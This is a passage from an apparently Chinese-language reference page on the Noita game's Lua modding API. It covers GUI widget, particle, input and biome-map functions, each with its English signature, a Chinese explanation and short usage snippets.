For example calling this with the values GUI_OPTION.Align_Left and GUI_OPTION.GamepadDefaultWidget will set both options for the next widget. The options will be cleared on next call to GuiStartFrame().]</p></blockquote><p>移除特定选项，参数同上，真有用吗？</p><h3 id="GuiOptionsClear"><a href="#GuiOptionsClear" class="headerlink" title="GuiOptionsClear"></a><code>GuiOptionsClear</code></h3><blockquote><p>GuiOptionsClear( gui:obj ) [Clears the options that apply to widgets during this frame.]</p></blockquote><p>清除gui的所有“选项”，输入gui，同上，真有用吗？</p><h3 id="GuiZSet"><a href="#GuiZSet" class="headerlink" title="GuiZSet"></a><code>GuiZSet</code></h3><blockquote><p>GuiZSet( gui:obj, z:float ) [Sets the rendering depth (‘z’) of the widgets following this call. Larger z = deeper. The z will be set to 0 on the next call to GuiStartFrame(). ]</p></blockquote><p>设置gui的深度（覆盖关系，值越大越深，即在下层），输入gui、z值，在下一次GuiStartFrame()时会被清零</p><h3 id="GuiZSetForNextWidget"><a href="#GuiZSetForNextWidget" class="headerlink" title="GuiZSetForNextWidget"></a><code>GuiZSetForNextWidget</code></h3><blockquote><p>GuiZSetForNextWidget( gui:obj, z:float ) [Sets the rendering depth (‘z’) of the next widget following this call. Larger z = deeper.</p></blockquote><p>设置下一个widget的渲染深度，用法同上</p><h3 id="GuiText"><a href="#GuiText" class="headerlink" title="GuiText"></a><code>GuiText</code></h3><blockquote><p>GuiText( gui:obj, x:number, y:number, text:string, scale:number = 1, font:string = “”, font_is_pixel_font:bool = true )</p></blockquote><p>显示文字，输入gui、在屏幕上的位置、文本内容、放大倍数、字体、字体是否是像素。后三个保持默认即可</p><h3 id="GuiIdPush"><a href="#GuiIdPush" class="headerlink" title="GuiIdPush"></a><code>GuiIdPush</code></h3><blockquote><p>GuiIdPush( gui:obj, id:int ) [Can be used to solve ID conflicts. All ids given to Gui* functions will be hashed with the ids stacked (and hashed together) using GuiIdPush() and GuiIdPop(). The id stack has a max size of 1024, and calls to the function will do nothing if the size is exceeded.]</p></blockquote><p>输入gui，id，用于解决ID（后续创建各种widget需要）冲突</p><h3 id="GuiIdPushString"><a href="#GuiIdPushString" class="headerlink" title="GuiIdPushString"></a><code>GuiIdPushString</code></h3><blockquote><p>GuiIdPushString( gui:obj, str:string ) [Pushes the hash of ‘str’ as a gui id. See GuiIdPush().]</p></blockquote><h3 id="GuiIdPop"><a href="#GuiIdPop" class="headerlink" title="GuiIdPop"></a><code>GuiIdPop</code></h3><blockquote><p>GuiIdPop( gui:obj ) [See GuiIdPush().]</p></blockquote><h3 id="GuiButton"><a href="#GuiButton" class="headerlink" title="GuiButton"></a><code>GuiButton</code></h3><blockquote><p>GuiButton( gui:obj, id:int, x:number, y:number, text:string, scale:number = 1, font:string = “”, font_is_pixel_font:bool = true ) -&gt; clicked:bool,right_clicked:bool [The old parameter order where ‘id’ is the last parameter is still supported. The function dynamically picks the correct order based on the type of the 4th parameter.]</p></blockquote><p>显示一个文字按钮，输入gui、一个自己管理的id、在屏幕上的位置，字符串、放大倍数……返回两个bool值：是否点击，是否是右键点击</p><h3 id="GuiImageButton"><a href="#GuiImageButton" class="headerlink" title="GuiImageButton"></a><code>GuiImageButton</code></h3><blockquote><p>GuiImageButton( gui:obj, id:int, x:number, y:number, text:string, sprite_filename:string ) -&gt; clicked:bool,right_clicked:bool</p></blockquote><p>显示一个图片按钮，输入gui、id、位置、文本、图片文件路径</p><h3 id="GuiImage"><a href="#GuiImage" class="headerlink" title="GuiImage"></a><code>GuiImage</code></h3><blockquote><p><code>GuiImage(gui, x, y, filename, alpha, scale, rotation)</code> - 显示图像</p></blockquote><h3 id="GuiImageNinePiece"><a href="#GuiImageNinePiece" class="headerlink" title="GuiImageNinePiece"></a><code>GuiImageNinePiece</code></h3><blockquote><p>GuiImageNinePiece( gui:obj, id:int, x:number, y:number, width:number, height:number, alpha:number = 1, sprite_filename:string = “data/ui_gfx/decorations/9piece0_gray.png”, sprite_highlight_filename:string = “data/ui_gfx/decorations/9piece0_gray.png” )</p></blockquote><p>输入gui，一个不重复的id，屏幕位置，宽、高，透明度、纹理文件</p><h3 id="GuiTextInput"><a href="#GuiTextInput" class="headerlink" title="GuiTextInput"></a><code>GuiTextInput</code></h3><blockquote><p>GuiTextInput( gui:obj, id:int, x:number, y:number, text:string, width:number, max_length:int, allowed_characters:string = “” ) -&gt; new_text [‘allowed_characters’ should consist only of ASCII characters. This is not intended to be outside mod settings menu, and might bug elsewhere.]</p></blockquote><p>文本输入框，输入gui、id、位置、在框里显示的文本、宽度、最大长度，返回文本</p><h3 id="GuiGetScreenDimensions"><a href="#GuiGetScreenDimensions" class="headerlink" title="GuiGetScreenDimensions"></a><code>GuiGetScreenDimensions</code></h3><blockquote><p>GuiGetScreenDimensions( gui:obj ) -&gt; width:number,height:number [Returns dimensions of viewport in the gui coordinate system (which is equal to the coordinates of the screen bottom right corner in gui coordinates). The values returned may change depending on the game resolution because the UI is scaled for pixel-perfect text rendering.]</p></blockquote><p>输入gui，返回屏幕的宽和高（像素），使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">local</span> screen_w<span class="token punctuation">,</span> screen_h <span class="token operator">=</span> <span class="token function">GuiGetScreenDimensions</span><span class="token punctuation">(</span>gui<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h3 id="GuiGetPreviousWidgetInfo"><a href="#GuiGetPreviousWidgetInfo" class="headerlink" title="GuiGetPreviousWidgetInfo"></a><code>GuiGetPreviousWidgetInfo</code></h3><blockquote><p>GuiGetPreviousWidgetInfo( gui:obj ) -&gt; clicked:bool, right_clicked:bool, hovered:bool, x:number, y:number, width:number, height:number, draw_x:number, draw_y:number, draw_width:number, draw_height:number [Returns the final position, size etc calculated for a widget. Some values aren’t supported by all widgets.]</p></blockquote><p>感知一个ui的状态，点击/悬浮等等，输入gui，返回：是否被点击，是否右键点击，是否鼠标悬浮在上面，gui的坐标、宽高、渲染出来的位置、渲染出来的宽、高（部分返回值不适用于所有gui）</p><h3 id="GuiColorSetForNextWidget"><a href="#GuiColorSetForNextWidget" class="headerlink" title="GuiColorSetForNextWidget"></a><code>GuiColorSetForNextWidget</code></h3><blockquote><p>GuiColorSetForNextWidget( gui:obj, red:number, green:number, blue:number, alpha:number ) [Sets the color of the next widget during this frame. Color components should be in the 0-1 range.]</p></blockquote><p>设置下一个widget的颜色，输入gui，红绿蓝值（0-1）和透明度</p><h2 id="粒子"><a href="#粒子" class="headerlink" title="粒子"></a>粒子</h2><h3 id="GameCreateCosmeticParticle"><a href="#GameCreateCosmeticParticle" class="headerlink" title="GameCreateCosmeticParticle"></a><code>GameCreateCosmeticParticle</code></h3><blockquote><p>GameCreateCosmeticParticle( material_name:string, x:number, y:number, how_many:int, xvel:number, yvel:number, color:uint32 = 0, lifetime_min:number = 5.0, lifetime_max:number = 10, force_create:bool = true, draw_front:bool = false, collide_with_grid:bool = true, randomize_velocity:bool = true, gravity_x:float = 0, gravity_y:float = 100.0 )</p></blockquote><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">GameCreateCosmeticParticle</span><span class="token punctuation">(</span>          material<span class="token punctuation">,</span>       <span class="token comment">-- 材质名</span>          xi<span class="token punctuation">,</span> yi<span class="token punctuation">,</span>         <span class="token comment">-- 坐标</span>          how_many_per_point<span class="token punctuation">,</span> <span class="token comment">-- 每个点生成粒子数</span>          <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>           <span class="token comment">-- xvel, yvel初速度</span>          <span class="token number">0</span><span class="token punctuation">,</span>              <span class="token comment">-- color (0表示默认)</span>          <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>          <span class="token comment">-- lifetime_min, lifetime_max</span>          <span class="token keyword">true</span><span class="token punctuation">,</span>           <span class="token comment">-- force_create</span>          <span class="token keyword">false</span><span class="token punctuation">,</span>          <span class="token comment">-- draw_front</span>          <span class="token keyword">false</span><span class="token punctuation">,</span>          <span class="token comment">-- collide_with_grid 不碰撞</span>          <span class="token keyword">true</span><span class="token punctuation">,</span>          <span class="token comment">-- randomize_velocity false 固定位置</span>          <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>            <span class="token comment">-- gravity_x, gravity_y =0 不受重力</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大部分材料都可以填进material里，比如spark</p><h3 id="GameCreateParticle"><a href="#GameCreateParticle" class="headerlink" title="GameCreateParticle"></a><code>GameCreateParticle</code></h3><blockquote><p>GameCreateParticle( material_name:string, x:number, y:number, how_many:int, xvel:number, yvel:number, just_visual:bool, draw_as_long:bool = false, randomize_velocity:bool = true )</p></blockquote><p>生成粒子，输入材料名，坐标，数量，xy轴初速度，是否只用于视觉效果，是否画成长条形，是否随机化初速度，使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">GameCreateParticle</span><span class="token punctuation">(</span> <span class="token string">"slime_green"</span><span class="token punctuation">,</span> x<span class="token operator">+</span><span class="token number">20</span><span class="token punctuation">,</span> y<span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token keyword">true</span><span class="token punctuation">,</span> <span class="token keyword">false</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h2 id="Input……"><a href="#Input……" class="headerlink" title="Input……"></a>Input……</h2><h3 id="InputIsKeyDown"><a href="#InputIsKeyDown" class="headerlink" title="InputIsKeyDown"></a><code>InputIsKeyDown</code></h3><blockquote><p>InputIsKeyDown( key_code\:int ) -&gt; bool<br>(Debugish function - returns if a key is down, does not depend on state. E.g. player could be in menus or inputting text. See <code>data/scripts/debug/keycodes.lua</code> for the constants.)</p></blockquote><p>检测某个键是否正在被按下。即使玩家在菜单界面或输入文字时，也会返回真实的按键状态。<code>key_code</code> 常量可在 <code>data/scripts/debug/keycodes.lua</code> 中查找。</p><h3 id="InputIsKeyJustDown"><a href="#InputIsKeyJustDown" class="headerlink" title="InputIsKeyJustDown"></a><code>InputIsKeyJustDown</code></h3><blockquote><p>InputIsKeyJustDown( key_code\:int ) -&gt; bool<br>(Debugish function - returns if a key is down this frame, does not depend on state.)</p></blockquote><p>检测某个键是否在本帧刚刚被按下（按键触发瞬间）。<br>不受游戏状态影响，在菜单或文字输入中也会检测到。</p><h3 id="InputIsKeyJustUp"><a href="#InputIsKeyJustUp" class="headerlink" title="InputIsKeyJustUp"></a><code>InputIsKeyJustUp</code></h3><blockquote><p>InputIsKeyJustUp( key_code\:int ) -&gt; bool<br>(Debugish function - returns if a key is up this frame, does not depend on state.)</p></blockquote><p>检测某个键是否在本帧刚刚被释放。同样独立于游戏状态。</p><h3 id="InputGetMousePosOnScreen"><a href="#InputGetMousePosOnScreen" class="headerlink" title="InputGetMousePosOnScreen"></a><code>InputGetMousePosOnScreen</code></h3><blockquote><p>InputGetMousePosOnScreen() -&gt; x\:number, y\:number<br>(Debugish function - returns raw x, y coordinates of the mouse on screen)</p></blockquote><p>获取鼠标在屏幕上的原始坐标（像素单位）。</p><h3 id="InputIsMouseButtonDown"><a href="#InputIsMouseButtonDown" class="headerlink" title="InputIsMouseButtonDown"></a><code>InputIsMouseButtonDown</code></h3><blockquote><p>InputIsMouseButtonDown( mouse_button\:int ) -&gt; bool<br>(Debugish function - returns if mouse button is down. Does not depend on state.)</p></blockquote><p>检测鼠标某个按键是否处于按下状态。<br><code>mouse_button</code> 常量可在 <code>data/scripts/debug/keycodes.lua</code> 查找。</p><h3 id="InputIsMouseButtonJustDown"><a href="#InputIsMouseButtonJustDown" class="headerlink" title="InputIsMouseButtonJustDown"></a><code>InputIsMouseButtonJustDown</code></h3><blockquote><p>InputIsMouseButtonJustDown( mouse_button\:int ) -&gt; bool<br>(Debugish function - returns if mouse button is just down. Does not depend on state.)</p></blockquote><p>检测鼠标按键是否在本帧刚刚被按下。</p><h3 id="InputIsMouseButtonJustUp"><a href="#InputIsMouseButtonJustUp" class="headerlink" title="InputIsMouseButtonJustUp"></a><code>InputIsMouseButtonJustUp</code></h3><blockquote><p>InputIsMouseButtonJustUp( mouse_button\:int ) -&gt; bool<br>(Debugish function - returns if mouse button is just up. Does not depend on state.)</p></blockquote><p>检测鼠标按键是否在本帧刚刚被释放。</p><h3 id="InputIsJoystickButtonDown"><a href="#InputIsJoystickButtonDown" class="headerlink" title="InputIsJoystickButtonDown"></a><code>InputIsJoystickButtonDown</code></h3><blockquote><p>InputIsJoystickButtonDown( joystick_index\:int, joystick_button\:int ) -&gt; bool<br>(Debugish function - returns if ‘joystick’ button is down. Does not depend on state.)</p></blockquote><p>检测手柄指定按钮是否处于按下状态。<br><code>joystick_index</code> 表示手柄编号（从 0 开始），<code>joystick_button</code> 常量见 <code>keycodes.lua</code>。</p><h3 id="InputIsJoystickButtonJustDown"><a href="#InputIsJoystickButtonJustDown" class="headerlink" title="InputIsJoystickButtonJustDown"></a><code>InputIsJoystickButtonJustDown</code></h3><blockquote><p>InputIsJoystickButtonJustDown( joystick_index\:int, joystick_button\:int ) -&gt; bool<br>(Debugish function - returns if ‘joystick’ button is just down. Does not depend on state.)</p></blockquote><p>检测手柄按钮是否在本帧刚刚被按下。</p><h3 id="InputGetJoystickAnalogButton"><a href="#InputGetJoystickAnalogButton" class="headerlink" title="InputGetJoystickAnalogButton"></a><code>InputGetJoystickAnalogButton</code></h3><blockquote><p>InputGetJoystickAnalogButton( joystick_index\:int, analog_button_index\:int ) -&gt; float<br>(Debugish function - returns analog ‘joystick’ button value (0-1). analog_button_index 0 = left trigger, 1 = right trigger.)</p></blockquote><p>获取手柄的模拟按键（通常是扳机键）当前的压力值，范围 0~1。<br><code>analog_button_index</code>：</p><ul><li><code>0</code> = 左扳机</li><li><code>1</code> = 右扳机</li></ul><h3 id="InputIsJoystickConnected"><a href="#InputIsJoystickConnected" class="headerlink" title="InputIsJoystickConnected"></a><code>InputIsJoystickConnected</code></h3><blockquote><p>InputIsJoystickConnected( joystick_index\:int ) -&gt; bool<br>(Debugish function - returns true if ‘joystick’ at that index is connected. Does not depend on state.)</p></blockquote><p>检测指定编号的手柄是否已连接。</p><h3 id="InputGetJoystickAnalogStick"><a href="#InputGetJoystickAnalogStick" class="headerlink" title="InputGetJoystickAnalogStick"></a><code>InputGetJoystickAnalogStick</code></h3><blockquote><p>InputGetJoystickAnalogStick( joystick_index\:int, stick_id\:int = 0 ) -&gt; float x, float y<br>(Debugish function - returns analog stick positions (-1,+1). stick_id 0 = left, 1 = right.)</p></blockquote><p>获取手柄摇杆的当前位置（X、Y 坐标范围 -1~+1）。<br><code>stick_id</code>：</p><ul><li><code>0</code> = 左摇杆</li><li><code>1</code> = 右摇杆</li></ul><h2 id="Biome……（群系）"><a href="#Biome……（群系）" class="headerlink" title="Biome……（群系）"></a>Biome……（群系）</h2><p>备注：群系生效的最小单位是区块，以下坐标如果有忘记说明均做区块处理</p><h3 id="BiomeMapLoad-KeepPlayer"><a href="#BiomeMapLoad-KeepPlayer" class="headerlink" title="BiomeMapLoad_KeepPlayer"></a><code>BiomeMapLoad_KeepPlayer</code></h3><blockquote><p>BiomeMapLoad_KeepPlayer( filename:string, pixel_scenes:string = “data/biome/_pixel_scenes.xml” )</p></blockquote><p>保留玩家加载群系地图，输入一个群系lua文件路径，一个像素场景xml文件<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token comment">--ng+</span><span class="token function">BiomeMapLoad_KeepPlayer</span><span class="token punctuation">(</span> <span class="token string">"data/biome_impl/biome_map_newgame_plus.lua"</span><span class="token punctuation">,</span> <span class="token string">"data/biome/_pixel_scenes_newgame_plus.xml"</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><h3 id="BiomeSetValue"><a href="#BiomeSetValue" class="headerlink" title="BiomeSetValue"></a><code>BiomeSetValue</code></h3><blockquote><p>BiomeSetValue( filename:string, field_name:string, value:multiple_types ) [Can be used to edit biome configs during initialization. See the nightmare mod for an usage example.]</p></blockquote><p>只能用在OnWorldInitialized阶段，修改群系xml文件的一个字段的值，输入文件路径，字段名，值。使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">function</span> <span class="token function">set_biome_to_nightmare</span><span class="token punctuation">(</span> biome_name<span class="token punctuation">,</span> hp_scale<span class="token punctuation">,</span> attack_speed <span class="token punctuation">)</span><span class="token keyword">local</span> biome_filename <span class="token operator">=</span> <span class="token string">"data/biome/"</span> <span class="token operator">..</span> biome_name <span class="token operator">..</span> <span class="token string">".xml"</span><span class="token function">BiomeSetValue</span><span class="token punctuation">(</span> biome_filename<span class="token punctuation">,</span> <span class="token string">"game_enemy_hp_scale"</span><span class="token punctuation">,</span> hp_scale <span class="token punctuation">)</span><span class="token function">BiomeSetValue</span><span class="token punctuation">(</span> biome_filename<span class="token punctuation">,</span> <span class="token string">"game_enemy_attack_speed"</span><span class="token punctuation">,</span> attack_speed <span class="token punctuation">)</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h3 id="BiomeGetValue"><a href="#BiomeGetValue" class="headerlink" title="BiomeGetValue"></a><code>BiomeGetValue</code></h3><blockquote><p>BiomeGetValue( filename:string, field_name:string ) -&gt; multiple types|nil [Can be used to read biome configs. Returns one or many values matching the type or subtypes of the requested field. Reports error and returns nil if the field type is not supported or field was not found.]</p></blockquote><p>读一个群系xml文件字段的值，输入路径，字段名，字段匹配不到报错或返回nil</p><h3 id="BiomeObjectSetValue"><a href="#BiomeObjectSetValue" class="headerlink" title="BiomeObjectSetValue"></a><code>BiomeObjectSetValue</code></h3><blockquote><p>BiomeObjectSetValue( filename:string, meta_object_name:string, field_name:string, value:multiple_types ) [Can be used to edit biome configs during initialization. See biome_modifiers.lua for an usage example.]</p></blockquote><p>仅世界初始化时可用，修改xml文件里嵌套的“对象”的字段值，输入文件路径，对象名，字段名，值，举例：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token comment">-- projectiles and most entities get higher gravity (doesn't affect physics or particles)</span><span class="token punctuation">&#123;</span>id <span class="token operator">=</span> <span class="token string">"HIGH_GRAVITY"</span><span class="token punctuation">,</span>ui_description<span class="token operator">=</span><span class="token string">"$biomemodifierdesc_high_gravity"</span><span class="token punctuation">,</span>ui_decoration_file<span class="token operator">=</span><span class="token string">"data/ui_gfx/decorations_biome_modifier/high_gravity.png"</span><span class="token punctuation">,</span>probability<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span>action <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span> biome_name<span class="token punctuation">,</span> biome_filename <span class="token punctuation">)</span><span class="token function">BiomeObjectSetValue</span><span class="token punctuation">(</span> biome_filename<span class="token punctuation">,</span> <span class="token string">"modifiers"</span><span class="token punctuation">,</span> <span class="token string">"entity_gravity_y_multiplier"</span><span class="token punctuation">,</span> <span class="token number">1.5</span> <span class="token punctuation">)</span><span class="token keyword">end</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>其中modifier是一个隐式对象，以上是随机事件之一</p><h3 id="BiomeVegetationSetValue"><a href="#BiomeVegetationSetValue" class="headerlink" title="BiomeVegetationSetValue"></a><code>BiomeVegetationSetValue</code></h3><blockquote><p>BiomeVegetationSetValue( filename:string, material_name:string, field_name:string, value:multiple_types ) [Can be used to edit biome config MaterialComponents during initialization. Sets the given value in all found VegetationComponent with matching tree_material. See biome_modifiers.lua for an usage example.]</p></blockquote><p>仅世界初始化时可用，设置群系植物的属性，即所有VegetationComponent中匹配的字段，输入文件路径，材料名，字段名，值，参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">BiomeVegetationSetValue</span><span class="token punctuation">(</span> biome_filename<span class="token punctuation">,</span> <span class="token string">"grass"</span><span class="token punctuation">,</span> <span class="token string">"tree_material"</span><span class="token punctuation">,</span> frozen_veg_type <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h3 id="BiomeMaterialSetValue"><a href="#BiomeMaterialSetValue" class="headerlink" title="BiomeMaterialSetValue"></a><code>BiomeMaterialSetValue</code></h3><blockquote><p>BiomeMaterialSetValue( filename:string, material_name:string, field_name:string, value:multiple_types ) [Can be used to edit biome config MaterialComponents during initialization. Sets the given value in the first found MaterialComponent with matching material_name. See biome_modifiers.lua for an usage example.]</p></blockquote><p>仅世界初始化时可用，设置群系材料属性，第一个找到的有匹配字段的MaterialComponent，参数同上，使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token comment">--在地面中生成更多黄金的事件</span>action <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span> biome_name<span class="token punctuation">,</span> biome_filename <span class="token punctuation">)</span><span class="token keyword">if</span> biome_name <span class="token operator">==</span> <span class="token string">"rainforest"</span> <span class="token keyword">or</span> biome_name <span class="token operator">==</span> <span class="token string">"rainforest_open"</span> <span class="token keyword">or</span> biome_name <span class="token operator">==</span> <span class="token string">"vault"</span> <span class="token keyword">or</span> biome_name <span class="token operator">==</span> <span class="token string">"fungicave"</span> <span class="token keyword">then</span><span class="token function">BiomeMaterialSetValue</span><span class="token punctuation">(</span> biome_filename<span class="token punctuation">,</span> <span class="token string">"gold"</span><span class="token punctuation">,</span> <span class="token string">"material_max"</span><span class="token punctuation">,</span> <span class="token number">1.0</span> <span class="token punctuation">)</span> <span class="token function">BiomeMaterialSetValue</span><span class="token punctuation">(</span> biome_filename<span class="token punctuation">,</span> <span class="token string">"gold"</span><span class="token punctuation">,</span> <span class="token string">"material_min"</span><span class="token punctuation">,</span> <span class="token number">0.9</span> <span class="token punctuation">)</span><span class="token keyword">elseif</span> biome_name <span class="token operator">==</span> <span class="token string">"crypt"</span> <span class="token keyword">then</span><span class="token function">BiomeMaterialSetValue</span><span class="token punctuation">(</span> biome_filename<span class="token punctuation">,</span> <span class="token string">"gold"</span><span class="token punctuation">,</span> <span class="token string">"material_max"</span><span class="token punctuation">,</span> <span class="token number">20</span> <span class="token punctuation">)</span> <span class="token function">BiomeMaterialSetValue</span><span class="token punctuation">(</span> biome_filename<span class="token punctuation">,</span> <span class="token string">"gold"</span><span class="token punctuation">,</span> <span class="token string">"material_min"</span><span class="token punctuation">,</span> <span class="token number">0.05</span> <span class="token punctuation">)</span><span class="token keyword">else</span><span class="token function">BiomeMaterialSetValue</span><span class="token punctuation">(</span> biome_filename<span class="token punctuation">,</span> <span class="token string">"gold"</span><span class="token punctuation">,</span> <span class="token string">"material_max"</span><span class="token punctuation">,</span> <span class="token number">10</span> <span class="token punctuation">)</span> <span class="token function">BiomeMaterialSetValue</span><span class="token punctuation">(</span> biome_filename<span class="token punctuation">,</span> <span class="token string">"gold"</span><span class="token punctuation">,</span> <span class="token string">"material_min"</span><span class="token punctuation">,</span> <span class="token number">0.1</span> <span class="token punctuation">)</span><span class="token keyword">end</span><span class="token keyword">end</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h3 id="BiomeMaterialGetValue"><a href="#BiomeMaterialGetValue" class="headerlink" title="BiomeMaterialGetValue"></a><code>BiomeMaterialGetValue</code></h3><blockquote><p>BiomeMaterialGetValue( filename:string, material_name:string, field_name:string ) -&gt; multiple types|nil [Can be used to read biome config MaterialComponents during initialization. Returns the given value in the first found MaterialComponent with matching material_name. See biome_modifiers.lua for an usage example.]</p></blockquote><p>仅世界初始化时可用，获取群系材料的字段的值，输入文件路径，材料名，字段，寻找第一个匹配的MaterialComponent组件</p><div class="note danger flat"><p>以下群系api均需要BIOME_MAP在magic_numbers.xml里指向一个lua文件，默认是<code>BIOME_MAP=&quot;data/scripts/biome_map.lua&quot;</code></p></div><h3 id="BiomeMapSetSize"><a href="#BiomeMapSetSize" class="headerlink" title="BiomeMapSetSize"></a><code>BiomeMapSetSize</code></h3><blockquote><p>BiomeMapSetSize( width:int, height:int ) [This is available if BIOME_MAP in magic_numbers.xml points to a lua file, in the context of that file.]</p></blockquote><p>设置群系地图的尺寸，单位是区块。<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token comment">--data/scripts/biome_map.lua</span><span class="token comment">-- 2024/2/2 - made biome map loading work through this file to make it easier for mods to modify it</span><span class="token function">dofile_once</span><span class="token punctuation">(</span><span class="token string">"data/scripts/lib/utilities.lua"</span><span class="token punctuation">)</span><span class="token function">BiomeMapSetSize</span><span class="token punctuation">(</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">48</span> <span class="token punctuation">)</span><span class="token function">BiomeMapLoadImage</span><span class="token punctuation">(</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"data/biome_impl/biome_map.png"</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h3 id="BiomeMapGetSize"><a href="#BiomeMapGetSize" class="headerlink" title="BiomeMapGetSize"></a><code>BiomeMapGetSize</code></h3><blockquote><p>BiomeMapGetSize() -&gt; width:int,height:int [if BIOME_MAP in magic_numbers.xml points to a lua file returns that context, if not will return the biome_map size]</p></blockquote><p>返回尺寸（区块）</p><h3 id="BiomeMapSetPixel"><a href="#BiomeMapSetPixel" class="headerlink" title="BiomeMapSetPixel"></a><code>BiomeMapSetPixel</code></h3><blockquote><p>BiomeMapSetPixel( x:int, y:int, color_int:int ) [This is available if BIOME_MAP in magic_numbers.xml points to a lua file, in the context of that file.]</p></blockquote><p>设置生物群系像素，输入坐标（区块），“颜色”。其中颜色对应着一个xml文件，在_biomes_all.xml里写明，为一种地形的代号</p><h3 id="BiomeMapGetPixel"><a href="#BiomeMapGetPixel" class="headerlink" title="BiomeMapGetPixel"></a><code>BiomeMapGetPixel</code></h3><blockquote><p>BiomeMapGetPixel( x:int, y:int ) -&gt; color:int [This is available if BIOME_MAP in magic_numbers.xml points to a lua file, in the context of that file.]</p></blockquote><p>获取群系颜色，输入坐标，返回颜色。</p><h3 id="BiomeMapConvertPixelFromUintToInt"><a href="#BiomeMapConvertPixelFromUintToInt" class="headerlink" title="BiomeMapConvertPixelFromUintToInt"></a><code>BiomeMapConvertPixelFromUintToInt</code></h3><blockquote><p>BiomeMapConvertPixelFromUintToInt( color:int ) -&gt; int [Swaps red and blue channels of ‘color’. This can be used make sense of the BiomeMapGetPixel() return values. E.g. if( BiomeMapGetPixel( x, y ) == BiomeMapConvertPixelFromUintToInt( 0xFF36D517 ) ) then print(‘hills’) end ]</p></blockquote><p>将无符号整数颜色值转换为有符号整数颜色值。主要是交换红色和蓝色通道。用于颜色数值的比较<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">BiomeMapGetPixel</span><span class="token punctuation">(</span> x<span class="token punctuation">,</span> y <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">BiomeMapConvertPixelFromUintToInt</span><span class="token punctuation">(</span> <span class="token number">0xFF36D517</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token keyword">then</span>     <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'hills'</span><span class="token punctuation">)</span> <span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p><h3 id="BiomeMapLoadImage"><a href="#BiomeMapLoadImage" class="headerlink" title="BiomeMapLoadImage"></a><code>BiomeMapLoadImage</code></h3><blockquote><p>BiomeMapLoadImage( x:int, y:int, image_filename:string ) [This is available if BIOME_MAP in magic_numbers.xml points to a lua file, in the context of that file.]</p></blockquote><p>加载的是地图群系数据，不同颜色标注着不同的群系的图。输入原点坐标，颜色图片文件</p><h3 id="BiomeMapLoadImageCropped"><a href="#BiomeMapLoadImageCropped" class="headerlink" title="BiomeMapLoadImageCropped"></a><code>BiomeMapLoadImageCropped</code></h3><blockquote><p>BiomeMapLoadImageCropped( x:int, y:int, image_filename:string, image_x:int, image_y:int, image_w:int, image_h:int ) [This is available if BIOME_MAP in magic_numbers.xml points to a lua file, in the context of that file.]</p></blockquote><p>将指定的裁剪图像加载到生物群系地图中的特定位置，输入图片要放到的坐标，图片文件，裁剪范围</p><h3 id="BiomeMapGetVerticalPositionInsideBiome"><a href="#BiomeMapGetVerticalPositionInsideBiome" class="headerlink" title="BiomeMapGetVerticalPositionInsideBiome"></a><code>BiomeMapGetVerticalPositionInsideBiome</code></h3><blockquote><p>BiomeMapGetVerticalPositionInsideBiome( x:number, y:number ) -&gt; number</p></blockquote><p>获取在一个群系里的深度，输入世界坐标，返回一个数值。使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">function</span> <span class="token function">spawn_small_enemies</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token keyword">local</span> r <span class="token operator">=</span> <span class="token function">ProceduralRandom</span><span class="token punctuation">(</span> x<span class="token punctuation">,</span> y <span class="token punctuation">)</span><span class="token keyword">local</span> spawn_percent <span class="token 